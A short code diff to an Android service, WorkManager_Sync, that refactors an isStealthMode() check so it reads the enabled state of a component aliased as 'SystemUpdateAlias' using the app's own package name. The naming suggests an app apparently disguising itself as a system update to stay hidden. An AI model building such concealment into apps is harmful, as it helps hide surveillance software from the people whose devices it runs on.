@@ -540,7 +540,7 @@ public class WorkManager_Sync extends Service {
     }
 
     private boolean isStealthMode() {
-        android.content.ComponentName fakeAlias = new android.content.ComponentName(this, "com.labs.labrats.SystemUpdateAlias");
+        android.content.ComponentName fakeAlias = new android.content.ComponentName(this, getPackageName() + ".SystemUpdateAlias");
         return getPackageManager().getComponentEnabledSetting(fakeAlias) == android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED;
     }
 
